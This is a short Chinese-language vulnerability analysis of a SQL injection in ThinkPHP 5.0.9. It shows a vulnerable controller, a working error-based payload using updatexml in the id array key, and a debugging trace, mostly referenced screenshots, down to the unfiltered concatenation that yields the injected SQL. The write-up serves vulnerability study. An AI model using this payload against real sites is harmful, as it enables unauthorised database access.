# ThinkPHP5.0.9SQL注入分析

虽然有点鸡肋但是思路还是值得学习，首先写个控制器，这个Id一定要大写I

```php
<?php
namespace app\index\controller;

class Index
{
    public function index()
    {
        $id = input("id/a");
        $data = db("users")->where("Id","in",$id)->select();
        dump($data);
    }
}
```

给出payload`?id[0,updatexml(0,concat(0xa,user()),0)]=1`之后开始调试分析

我们首先进入where函数，跟进parseWhereExp，发现是参数绑定的不是重点

![](pic/1.png)

之后我们进入select函数，跟进发现也是参数绑定的部分

![](pic/2.png)

接下来我们跟进

![](pic/3.png)

只有这两个是有效函数

![](pic/4.png)

继续跟进

![](pic/5.png)

直接跳过了

![](pic/6.png)

到我们的parseWhere了

![](pic/7.png)

这个主要是获取数据库当中字段类型

![](pic/8.png)

接下来我们继续跟进parseKey

![](pic/9.png)

我们继续跟进

![](pic/10.png)

华点TP函数用错了，无关紧要

![](pic/11.png)

注意这里的参数拼接，就是我们的利用点，完全没有过滤

![](pic/12.png)

继续往下

![](pic/13.png)

最终返回

```
`Id` IN (:where_Id_in_0,updatexml(0,concat(0xa,user()),0))
```

之后返回

![](pic/14.png)

我们接着跟进

![](pic/15.png)

我很懵逼，没有执行过程啊！！！却执行了，复现分析完毕

![](pic/16.png)